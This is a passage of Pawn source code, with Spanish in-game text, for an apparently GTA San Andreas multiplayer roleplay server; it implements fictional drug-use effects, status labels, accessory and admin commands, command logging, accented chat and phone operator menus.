				SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, 999);

				new VIH = random(10);
				if(VIH == 5 || VIH == 7)	cuenta[playerid][pSIDA] += 1;

				cuenta[playerid][pEpilepsia] += 10;
				cuenta[playerid][pCancer] += 5;

				format(string, sizeof(string), "* %s consume un polvo blanco.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
   				ApplyAnimation(playerid, "SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0);
				UsingDrugs[playerid] = 1 ;
   				Mensaje(playerid, COLOR_BLANCO, "Has tomado speed, el efecto de la droga durará 2 minutos");
   				cuenta[playerid][cSpeed] -= 1;
   				DrugTimer[playerid] = SetTimerEx("SpeedEffectEnd", 120000, true, "i", playerid);
			}
			else if(strcmp(params[0], "extasis", true) == 0)
	        {
	            if(cuenta[playerid][cExtasis] == 0)return Mensaje(playerid, COLOR_BLANCO, "No tienes pastillas de extasis!");

	            cuenta[playerid][pEpilepsia] += 10;
	            new Mareo = random(50000), Float:Health, Vida = random(80);

				SetPlayerDrunkLevel(playerid, Mareo);
				GetPlayerHealth(playerid, Health);
				SetHP(playerid, Health+float(Vida));
				SetPlayerWeather(playerid, 2009);

				format(string, sizeof(string), "* %s se toma una pastilla de color.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1, 0, 1, 1, 0, 1);
				UsingEctasy[playerid] = 300;
				EctasyEffect[playerid] = 1;
				UsingDrugs[playerid] = 1 ;
				Mensaje(playerid, COLOR_BLANCO, "Has tomado extasis, el efecto de la droga durará 5 minutos");
				cuenta[playerid][cExtasis] -= 1;
				SetPlayerVirtualWorld(playerid, 5);
				DrugTimer[playerid] = SetTimerEx("Ectasy", 1000, true, "i", playerid);
			}
			else if(strcmp(params[0], "ritalin", true) == 0)
	        {
	            if(cuenta[playerid][cRitalin] == 0)return Mensaje(playerid, COLOR_BLANCO, "No tienes pastillas de Ritalin!");

	            cuenta[playerid][pEpilepsia] += 3;
	            cuenta[playerid][pCancer] += 3;

	            new VIH = random(10), Mareo = random(5);

				if(VIH == 2 || VIH == 8)		cuenta[playerid][pSIDA] += 1;
				SetPlayerDrunkLevel(playerid, Mareo*1000);
				darArmadura(playerid, Mareo*20);
				SetPlayerWeather(playerid, -68);
				format(string, sizeof(string), "* %s se toma una pastilla blanca.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1, 0, 1, 1, 0, 1);
				UsingRitalin[playerid] = 300;
				RitalinEffect[playerid] = 1;
				UsingDrugs[playerid] = 1 ;
				Mensaje(playerid, COLOR_BLANCO, "Has tomado Ritalin, el efecto de la droga durará 5 minutos");
				cuenta[playerid][cRitalin] -= 1;
			}
			else if(strcmp(params[0], "heroina", true) == 0)
	        {
	            if(cuenta[playerid][cHeroina] == 0)return Mensaje(playerid, COLOR_BLANCO, "No tienes suficiente Heroina!");

	            cuenta[playerid][pEpilepsia] += 5;
	            cuenta[playerid][pCancer] += 5;

	            new VIH = random(15);

				if(VIH == 8)			cuenta[playerid][pSIDA] += 1;
				SetHP(playerid, 100.0);
				format(string, sizeof(string), "* %s se inyecta una substancia.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ApplyAnimation(playerid, "CRACK", "crckdeth2", 2.5, 1, 0, 1, 0, 0);
				UsingHeroina[playerid] = 120;
				HeroinaEffect[playerid] = 1;
				HeroinaBeat[playerid] = 1;
				UsingDrugs[playerid] = 1 ;
				Mensaje(playerid, COLOR_BLANCO, "Has tomado Heroina, el efecto de la droga durará 2 minutos");
   				cuenta[playerid][cHeroina] -= 1;
			}
			else if(strcmp(params[0], "marihuana", true) == 0)
	        {
	            if(cuenta[playerid][cMarihuana] == 0)return Mensaje(playerid, COLOR_BLANCO, "No tienes suficiente Marihuana!");

	            cuenta[playerid][pEpilepsia] += 5;
	            cuenta[playerid][pCancer] += 5;

	            new VIH = random(15);

				if(VIH == 8)			cuenta[playerid][pSIDA] += 1;
				SetHP(playerid, 200);
				format(string, sizeof(string), "* %s fuma marihuana.", PlayerName(playerid));
   				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ApplyAnimation(playerid, "CRACK", "crckdeth2", 2.5, 1, 0, 1, 0, 0);
				UsingMarihuana[playerid] = 120;
				MarihuanaEffect[playerid] = 1;
				MarihuanaBeat[playerid] = 1;
				UsingDrugs[playerid] = 1 ;
				Mensaje(playerid, COLOR_BLANCO, "Has fumado Marihuana, el efecto de la droga durará 2 minutos");
   				cuenta[playerid][cMarihuana] -= 1;
			}
        }
        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /usardrogas <nombre> (speed, extasis, ritalin, heroina, marihuana)");
        return 1;
    }
   	command(estadodeshb, playerid, params[])
	{
		if(cuenta[playerid][cNivel] < 2)return Mensaje(playerid, COLOR_GRIS2, "Debes ser mínimo nivel 2 para utilizar este comando.");
		DialogoEstado(playerid);
		return 1;
	}

COMMAND:miestado(playerid, params[])
{
	new mensaje[64], string[144];
	if(sscanf(params, "s[64]", mensaje))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /miestado [Estado Actual]");
	if(booleano[ConEstado]{playerid})return Mensaje(playerid, COLOR_ROJO, "Ya estas en un estado. Usa /sinestado");
	
	format(string, sizeof(string), "Estado: {FFFFFF}%s", mensaje);
	Update3DTextLabelText(estado[playerid], COLOR_GRIS2, string);
	Attach3DTextLabelToPlayer(estado[playerid], playerid, 0.0, 0.0, 0.5);
	
	format(string, sizeof(string), "Te pusiste de estado: {FFFFFF}%s", mensaje);
	Mensaje(playerid, COLOR_LIMA, string);
	Mensaje(playerid, COLOR_GRIS2, "Para borrar tu estado usa /sinestado");
	booleano[ConEstado]{playerid} = true;
	return 1;
}

COMMAND:sinestado(playerid, params[])
{
	if(!booleano[ConEstado]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No tienes ningun estado.");
	
	Update3DTextLabelText(estado[playerid], COLOR_GRIS2, "void");
	Attach3DTextLabelToPlayer(estado[playerid], playerid, 0.0, 0.0, 1000.0);
	
	booleano[ConEstado]{playerid} = false;
	Mensaje(playerid, COLOR_GRIS2, "Has borrado tu estado actual.");
	return 1;
}

	// zcmd:toys =======================================================================================================================
    command(toyayuda, playerid, params[])
    {
		ClearChatbox(playerid, 10);
        Mensaje(playerid, COLOR_VERDE, "Ayuda Accesorios");
        Mensaje(playerid, COLOR_BLANCO, "Para comprar un accesorio en la tienda habla con los {00B39D}NPC");
        Mensaje(playerid, COLOR_BLANCO, "Para ponerte y editar un accesorio usa: {00B39D}/toys");
        Mensaje(playerid, COLOR_BLANCO, "Para ponerte todos tus accesorios usa: {00B39D}/ptoys");
        Mensaje(playerid, COLOR_BLANCO, "Para quitarte todos tus accesorios usa: {00B39D}/qtoys");
        return 1;
    }
    command(toys, playerid, params[])
    {
	    ShowPlayerDialog( playerid, TOYS, DIALOG_STYLE_LIST, "Toy Menu", "Poner o Quitar\nEditar\nEliminar", "Ok", "Cancelar" );
	    return 1;
    }

    command(qtoys, playerid, params[])
    {
	    Mensaje(playerid, COLOR_ROJO3, "* Te quitaste todos los toys de tu inventario.");
	    for(new x;x<MAX_PLAYERTOYS;x++)
	    {
		    RemovePlayerAttachedObject(playerid, x);
        }
        return 1;
    }
    command(dobleexp, playerid, params[]){
		new string[128];
	    if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
	    if(DobleOn != 1){
			format(string, sizeof(string), "{FFFFFF}%s ha {CDE878}activado {FFFFFF}la doble experiencia.", PlayerName(playerid));
            MensajeGlobal(-1, string);
            DobleOn = 1;
         }else{
            DobleOn = 0;
            format(string, sizeof(string), "{FFFFFF}%s ha {F80F60}desactivado {FFFFFF}la doble experiencia.", PlayerName(playerid));
            MensajeGlobal(-1, string);
	    }
	    return 1;
	}
 	command(tripleexp, playerid, params[]){
		new string[128];
	    if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
	    if(TripleOn != 1){
			format(string, sizeof(string), "{FFFFFF}%s ha {CDE878}activado {FFFFFF}la TRIPLE experiencia.", PlayerName(playerid));
            MensajeGlobal(-1, string);
            TripleOn = 1;
         }else{
            TripleOn = 0;
            format(string, sizeof(string), "{FFFFFF}%s ha {F80F60}desactivado {FFFFFF}la TRIPLE experiencia.", PlayerName(playerid));
            MensajeGlobal(-1, string);
	    }
	    return 1;
	}
	command(condon, playerid, params[])
	{
	    if(cuenta[playerid][cSexo] == 2)return Mensaje(playerid, COLOR_GRIS2, "Solo los hombres pueden usar este comando.");
	    if(Condom[playerid] != 0)
		{
			new string[128];
			format(string, sizeof(string), "* %s toma un condon y se lo coloca en el pene.", PlayerName(playerid));
        	ProxDetector(15.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
    	    Mensaje(playerid, COLOR_GRIS2, "Ahora ya estas protegido para tener relaciones sexuales con seguridad.");
        	Condom[playerid] --;
        	return 1;
		} else return Mensaje(playerid, COLOR_GRIS2, "No tienes un condon.");
  	}

 	command(saludar, playerid, params[])
  	{
  	    if(!sscanf(params, "u", params[0]))
  	    {
			if(IsPlayerConnected(params[0]))
			{
			    if(playerid != params[0])
			    {
				    if(dDistanciaJugador(2.0, playerid, params[0]))
				    {
				        new string[80];
						Saludo_ID[params[0]] = playerid;
						format(string, sizeof string, "* %s ha enviado una peticion de saludo, usa /aceptar saludo.", PlayerName(playerid));
						Mensaje(params[0], COLOR_BLANCO, string);
					} else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
				} else Mensaje(playerid, COLOR_GRIS2, "No puedes saludarte a ti mismo.");
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /saludar <PlayerID>");
		return 1;
  	}
	command(emisora, playerid, params[])
	{
		if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_AMARILLO, "No estás en un vehiculo!");
		if(IsPlayerConnected(playerid))
		{
		ShowPlayerDialog(playerid, Radios, DIALOG_STYLE_LIST, 
		"Selecciona Tu Emisora", "{ADFF2F}Drumm Bass\n{7B68EE}LaMEGARADIO\nRMassiveDubstep\n{912CEE}ReservaRap\n{CAE1FF}Los40\nReggae\n{FF8000}House", 
		"Sintonizar", "Cancelar");

		}
		return 1;
	}
	command(pararemisora, playerid, params[])
 	{
   	    StopAudioStreamForPlayer(playerid); // Parar las retransmisiones
   	    Mensaje(playerid, COLOR_AMARILLO, "Has apagado tu emisora");
   	    return 1;
   	    }

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(!booleano[gIngreso]{playerid})return false;
	else if(booleano[npcUse]{playerid})
	{
		Mensaje(playerid, COLOR_ROJO, "Usted no puede usar comandos en este momento.");
		return false;
	}
	if(cuenta[playerid][cAdministrador] < 2014 && cuenta[playerid][cCarcel] == 1)
	{
		if(!strfind(cmdtext, "/w", true)){ }
		else if(!strfind(cmdtext, "/dm", true)){ }
		else if(!strfind(cmdtext, "/pg", true)){ }
		else if(!strfind(cmdtext, "/mg", true)){ }
		else if(!strfind(cmdtext, "/fk", true)){ }
		else if(!strfind(cmdtext, "/ck", true)){ }
		else if(!strfind(cmdtext, "/reglas", true)){ }
		else if(!strfind(cmdtext, "/ayuda", true)){ }
		else if(!strfind(cmdtext, "/hora", true)){ }
		else if(!strfind(cmdtext, "/duda", true)){ }
		else 
		{
			Mensaje(playerid, COLOR_ROJO, "No puedes usar comandos en JAIL OOC!");
			Mensaje(playerid, COLOR_GRIS2, "Solo puedes usar /ayuda, /duda, /w y /hora");
			return false;
		}
	}
    if(GetPVarInt(playerid, "LoadingObjects") == 1)
	{
	    Mensaje(playerid, COLOR_AZUL_CLARO, "Atención!:{FFFFFF} Usted no puede utilizar comandos en este momento.");
	    return 0;
	}
	return 1;
}

command(getcar, playerid, params[]){
	new carid;
	if(cuenta[playerid][cAdministrador] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid}){
		Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "i", carid)){
		if(EsComprable(carid) && !autos[carid][cOwned]) return Mensaje(playerid, COLOR_GRIS2, "Vehiculo no esta agregado!");
			
		new Float:plocx, Float:plocy, Float:plocz;
		GetPlayerPos(playerid, plocx, plocy, plocz);
		return SetVehiclePosEx(carid, plocx, plocy+5.0, plocz);
	} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /getcar <VehicleID>");
	return 1;
}

command(gotocar, playerid, params[]){
	new carid;
	if(cuenta[playerid][cAdministrador] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid}){
		SendClientMessage(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", carid)){
		if(EsComprable(carid) && autos[carid][cOwned] == 0)
			return Mensaje(playerid, COLOR_GRIS2, "Vehiculo no esta agregado!");

	        new Float:cwx2, Float:cwy2, Float:cwz2;
			GetVehiclePos(carid, cwx2, cwy2, cwz2);
			return SetPlayerPos(playerid, cwx2, cwy2, cwz2);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /gotocar [ID Vehiculo]");
		return 1;
    }

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	static string[128], iint[6];
	string[0] = '\0';
	if(!success) ShowInfoForPlayer(playerid, "~W~El comando colocado esta incorrecto o ~r~no existe.~W~ Utiliza:~r~ /ayuda.", 3000);
	else 
	{
		new ip[16];
		
		getdate(iint[2], iint[1], iint[0]);
		gettime(iint[3], iint[4], iint[5]);
		GetPlayerIp(playerid, ip, sizeof(ip));
		
		format(string, sizeof(string), "cmds%02d%02d%04d.ini", iint[0], iint[1], iint[2]);
		new File:logcmds = fopen(string, io_append);
		
		format(string, sizeof(string), "[%d/%d/%d - %d:%d:%d] %s[%d][IP: %s] Uso: %s\r\n", iint[0], iint[1], iint[2], iint[3], iint[4], iint[5], Nombre(playerid), playerid, ip, cmdtext);
		fwrite(logcmds, string);
		fclose(logcmds);
	}
   return 1;
}

CallBack::ProxDetector(Float:radi, playerid, string[], col1, col2, col3, col4, col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		for(new i=0, _max=GetMaxPlayers();i<_max;i++)
		{
			if(IsPlayerConnected(i) && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i)))
			{
				if(!booleano[BigEar]{i})
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16))){
						Mensaje(i, col1, string);
					}else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8))){
						Mensaje(i, col2, string);
					}else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4))){
						Mensaje(i, col3, string);
					}else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2))){
						Mensaje(i, col4, string);
					}else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))){
						Mensaje(i, col5, string);
					}
				}
				else
				{
					Mensaje(i, col1, string);
				}
			}
		}
	}
	return 1;
}
CallBack::dDistanciaJugador(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}
public OnPlayerStreamIn(playerid, forplayerid)
{
	if(Maskuse[playerid] && IsPlayerConnected(forplayerid) && !cuenta[forplayerid][cAdministrador])
	{
		ShowPlayerNameTagForPlayer(forplayerid, playerid, false);
	}
    return 1;
}
public OnPlayerText(playerid, text[])
{
	if(estaSilenciado(playerid))return false;
	if(!cuenta[playerid][cTutorial])return false;
	if(cuenta[playerid][cCarcel] == 1)
	{
		Mensaje(playerid, COLOR_ROJO, "No puedes hablar en JAIL OOC!");
		Mensaje(playerid, COLOR_GRIS2, "Solo puedes usar /duda, /w y /hora");
		return false;
	}
	
	if(GetPlayerDrunkLevel(playerid) > 3000)
	{
		new modTamano = strlen(text);
		for(new i=0; i < modTamano; i++)
		{
			if(text[i] == 's')text[i] = 'z';
			else if(text[i] == 'S')text[i] = 'z';
		}
	}
	
    AnimacionTalk(playerid, text);
	new string[128], tmp[32], car = GetVehicleModel(GetPlayerVehicleID(playerid));
	
    if(palabrasProhibidas(text))
    {
        format(string, sizeof(string), "{11BB11}- AntiSPAM {FFFFFF}|| {FF2200}%s(%d): {FFFFFF}%s ||", PlayerName(playerid), playerid, text); 
		AdminMensaje(string);
		Mensaje(playerid, COLOR_AMARILLO, "No intentes hacer SPAM!");
    	return 0;
   	}
	
	if(booleano[TalkingLive]{playerid})
	{
		if(cuenta[playerid][cRango] >= 3)
		{
			if(car == 488 || car == 582)
			{
				format(string, sizeof(string), "[CNN-Directo](%s): %s", PlayerName(playerid), text);
				OOCNews(0x00B75BFF, string);
	    	}else Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo CNN!");
			return 0;
		}
		else
		{
			if(EsPeriodista(playerid))
			{
				format(string, sizeof(string), "[CNN-Directo](%s): %s", PlayerName(playerid), text);
				OOCNews(0x00B75BFF, string);
			}else{
				format(string, sizeof(string), "[CNN-Directo]Invitado(%s): %s", PlayerName(playerid), text);
				OOCNews(0x00B75BFF, string);
			}
			return 0;
		}
	}
	
	if(IsPlayerInAnyVehicle(playerid) && Mobile[playerid] == 255)
	{
		new vehicle = GetPlayerVehicleID(playerid);
		if(EsAuto(vehicle))
		{
			if(autoVentana{vehicle})
			{
				format(string, sizeof(string), "%s [Ventana Abierta]: %s", PlayerName(playerid), text);
				ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
				return false;
			}
			else
			{
				for(new i=0, t=GetMaxPlayers();i<t;i++)
				{
					if(IsPlayerInAnyVehicle(i) && GetPlayerVehicleID(i) == vehicle)
					{
						format(string, sizeof(string), "%s [Ventana Cerrada]: %s", PlayerName(playerid), text);
						Mensaje(i, COLOR_FADE1, string);
					}
				}
				return false;
			}
		}
	}
   	switch(cuenta[playerid][cAcento])
	{
		case 0, 1:
		{
			format(string, sizeof(string), "%s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 2:
		{
			format(string, sizeof(string), "[Acento Britanico] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 3, 4, 5:
		{
			format(string, sizeof(string), "[Acento Asiático] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 6:
		{
			format(string, sizeof(string), "[Acento Escocés] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 7:
		{
			format(string, sizeof(string), "[Acento Irlandés] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 8:
		{
			format(string, sizeof(string), "[Acento Ruso] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 9:
		{
			format(string, sizeof(string), "[Acento Americano] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 10:
		{
			format(string, sizeof(string), "[Acento Español] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 11:
		{
			format(string, sizeof(string), "[Acento Colombiano] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 12:
		{
			format(string, sizeof(string), "[Acento Francés] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 13:
		{
			format(string, sizeof(string), "[Acento Italiano] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 14:
		{
			format(string, sizeof(string), "[Acento Gangster] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 15:
		{
			format(string, sizeof(string), "[Acento Australiano] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 16:
		{
			format(string, sizeof(string), "[Acento Árabe] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 17:
		{
			format(string, sizeof(string), "[Acento Argentino] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 18:
		{
			format(string, sizeof(string), "[Acento Canadiense] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 19:
		{
			format(string, sizeof(string), "[Acento Cubano] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 20:
		{
			format(string, sizeof(string), "[Acento Israeli] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 21:
		{
			format(string, sizeof(string), "[Acento Alemán] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		case 22:
		{
			format(string, sizeof(string), "[Acento Hippie] %s dice: %s", PlayerName(playerid), text);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
	}
	if(UsingEctasy[playerid] > 0)
	{
		Mensaje(playerid, COLOR_CIAN, "Una fuerza desconocida te impide hablar!");
		return 0;
	}
	if(Mobile[playerid] != 255)
	{
		new idx;
		tmp = strtok(text, idx);
		format(string, sizeof(string), "(Teléfono) %s: %s", PlayerName(playerid), text);
		ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		// -================= Mecanicos =======================- //
		if(Mobile[playerid] == 556)
		{
   			if(!strlen(tmp))
			{
			    Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}¿Si necesita asistencia, diga ASISTENCIA, para anular la llamada NO?");
			 	return 0;
			}
			else if ((strcmp("asistencia", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("asistencia")))
			{
				Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Muy bien! Necesita asistencia!");
                Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {F5DEB3}Puedes llamar a los siguientes mecánicos de tu zona.");
                Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {F5DEB3}Gracias por preferirnos, si no hay mecánicos intente en otro momento.");
                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
                SetTimerEx("RemoveHand", 1800, false, "i", playerid);
				for(new i=0, _max=GetMaxPlayers();i<_max;i++){
					if(IsPlayerConnected(i)){
						if(Team_Mecanicos(i) && booleano[OnDuty]{i}){
							format(string, 256, "  Tlf: %d - Nombre: %s", cuenta[i][cTelefono] , PlayerName(i));
							Mensaje(playerid, -1, string);
							Mobile[playerid] = 255;
						}
				    }
				}
				return 0;
			}
			else if ((strcmp("no", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("no")))
			{
				Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Anuló la llamada!");
				Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Pásese por el taller y descubra ofertas en tuning, arreglos etc!");
				Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Que tenga buen día!");
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
                SetTimerEx("RemoveHand", 1800, false, "i", playerid);
				Mobile[playerid] = 255;
				return 0;
			}
			else
			{
				Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}¿Si necesita asistencia, diga ASISTENCIA, para anular la llamada NO?");
				return 0;
			}
		}
		// -================= Transportes =====================- //
		if(Mobile[playerid] == 446)
		{
			if(!strlen(tmp))
			{
			    Mensaje(playerid, COLOR_BLANCO, "{EE9900}Operadora: {FFFFFF}¿Donde está en LS o LV?");
			 	return 0;
			}
			else if ((strcmp("LS", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("LS")))
			{
				Mensaje(playerid, COLOR_BLANCO, "{EE9900}Operadora: {FFFFFF}¿En que zona está?");
				Mobile[playerid] = 447;
				return 0;
			}
			else if ((strcmp("LV", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("LV")))
			{
				Mensaje(playerid, COLOR_BLANCO, "{EE9900}Operadora: {FFFFFF}¿En que zona está?");
				Mobile[playerid] = 448;
				return 0;
			}
			else
			{
				Mensaje(playerid, COLOR_BLANCO, "{EE9900}Operadora: {FFFFFF}¿Donde está en LS o LV?");
				return 0;
			}
		}
		// -============================ Emergencias ============================- //
		if(Mobile[playerid] == 915)
		{
		    if(!strlen(tmp))
			{
				Mensaje(playerid, COLOR_CIAN, "Central: Entendido, ¿su ubicación porfavor?");
				return 0;
			}
			new wanted[128];
			format(wanted, sizeof(wanted), "Central: %s necesita una ambulancia. Lugar: (%s)", PlayerName(playerid), text);
			SendFamilyMessage(3, COLOR_CIAN, wanted);
			format(wanted, sizeof(wanted), "* Incidente: %s", Situacion[playerid]);
			SendFamilyMessage(3, COLOR_CIAN, wanted);
